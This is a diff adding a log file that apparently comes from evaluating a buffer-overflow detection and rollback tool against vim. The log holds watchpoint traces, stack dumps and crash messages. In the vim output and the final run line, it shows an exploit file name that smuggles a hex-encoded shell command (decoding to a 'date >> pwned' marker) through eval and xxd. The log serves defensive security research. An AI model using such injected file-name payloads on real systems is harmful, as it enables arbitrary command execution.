@@ -1,0 +1,212 @@
+0 : in the beginning initialize
+Vim: Warning: Output is not to a terminal
+read on fd 6
+read on fd 6
+read on fd 6
+read on fd 6
+read on fd 6
+read on fd 6
+read on fd 6
+7[?47h[?1h=[1;26r[m[H[2J[26;1H"sploit/foo%;eval eval `echo 0:64617465203e3e2070776e6564 | xxd -r`;'bar" is a directoryOVERFLOW!!!! now it is 0x2a2f726162222722 at 0x2aabfc4c7880
+CAUGHT: problematic address 0x2aabfc4c7880 with value 0x2a2f726162222722!!!!!
+OVERFLOW!!!! now it is 0xcafebabecafeba00 at 0x2aabfc4c7888
+CAUGHT: problematic address 0x2aabfc4c7888 with value 0xcafebabecafeba00!!!!!
+***************fops rollback now!**************
+
+
+NOW ROLLING BACK
+
+
+OVERFLOW!!!! now it is 0x2a2f726162222722 at 0x2aabfc4c7880
+CAUGHT: problematic address 0x2aabfc4c7880 with value 0x2a2f726162222722!!!!!
+OVERFLOW!!!! now it is 0xcafebabecafeba00 at 0x2aabfc4c7888
+CAUGHT: problematic address 0x2aabfc4c7888 with value 0xcafebabecafeba00!!!!!
+***************fops rollback now!**************
+
+
+NOW ROLLING BACK
+
+
+CAUGHT: problematic address 0x2aabfc4c7880 with value 0x2a2f726162222722!!!!!
+CAUGHT: problematic address 0x2aabfc4c7888 with value 0xcafebabecafeba00!!!!!
+
+Command terminated
+CAUGHT: problematic address 0x2aabfc3f1e20 with value 0x2e2f726162222722!!!!!
+CAUGHT: problematic address 0x2aabfc3f1e28 with value 0xcafebabecafe002a!!!!!
+getFileInfo: fd -1429236720 is not existing
+vim: sys_fops.h:423: fops::fileInfo fops::getFileInfo(int): Assertion `0' failed.
+error!
+
+Command terminated
+[?1l>[2J[?47l8Vim: Caught deadly signal ABRT
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d193a, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeeeeeeeee056f22 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x20a)[0x4d193a]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1966, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeeeeeeeee052722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x236)[0x4d1966]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1995, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeeeeeeeee222722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x265)[0x4d1995]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1b93, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeeeeeee62222722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x463)[0x4d1b93]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1b93, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeeeee6162222722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x463)[0x4d1b93]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1b93, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value eeee726162222722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x463)[0x4d1b93]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1b93, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value ee2f726162222722 Faulted Value 2a2f726162222722
+	Now watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x463)[0x4d1b93]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d1b93, detailed information:
+	OVERFLOW NOW!!!!Watchpoint 0: at 0x2aabfc4c7880 value 2a2f726162222722 Faulted Value 2a2f726162222722
+	OVERFLOW NOW!!!!Watchpoint 1: at 0x2aabfc4c7888 value cafebabecafebabe Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x463)[0x4d1b93]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+Source code information about overflow site:
+callstack frame 3: ??:0
+callstack frame 4: ??:0
+callstack frame 5: ??:0
+callstack frame 6: ??:0
+callstack frame 7: ??:0
+
+
+
+
+
+CAPTURING writes at watchpoints from ip 0x4d19a2, detailed information:
+	Now watchpoint 0: at 0x2aabfc4c7880 value 2a2f726162222722 Faulted Value 2a2f726162222722
+	OVERFLOW NOW!!!!Watchpoint 1: at 0x2aabfc4c7888 value cafebabecafeba00 Faulted Value cafebabecafeba00
+/lib64/libc.so.6[0x3ce3e302f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(mch_expand_wildcards+0x272)[0x4d19a2]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(gen_expand_wildcards+0x33e)[0x49f63e]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(expand_wildcards+0x1c)[0x49f96c]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x46ab26]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim(ExpandOne+0x180)[0x46b1f0]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x443e5d]
+/nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim[0x4454ab]
+
+Source code information about overflow site:
+callstack frame 3: ??:0
+callstack frame 4: ??:0
+callstack frame 5: ??:0
+callstack frame 6: ??:0
+callstack frame 7: ??:0
+
+
+CAUGHT: problematic address 0x2aabfc4c7880 with value 0x2a2f726162222722!!!!!
+CAUGHT: problematic address 0x2aabfc4c7888 with value 0xcafebabecafeba00!!!!!
+
+Command terminated
+CAUGHT: problematic address 0x2aabfc3f1e20 with value 0x2e2f726162222722!!!!!
+CAUGHT: problematic address 0x2aabfc3f1e28 with value 0xcafebabecafe002a!!!!!
+getFileInfo: fd -1429236720 is not existing
+vim: sys_fops.h:423: fops::fileInfo fops::getFileInfo(int): Assertion `0' failed.
+error!
+
+Command terminated
+[?1l>[2J[?47l8Vim: Caught deadly signal ABRT
+./run.sh: line 10: 12245 Segmentation fault      /nfs/cm/scratch1/tonyliu/grace/branches/stopgap-singlethread/effectiveness/vim/src/vimbin/bin/vim '+:norm jjmtjmfmc' +:q -- "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar""
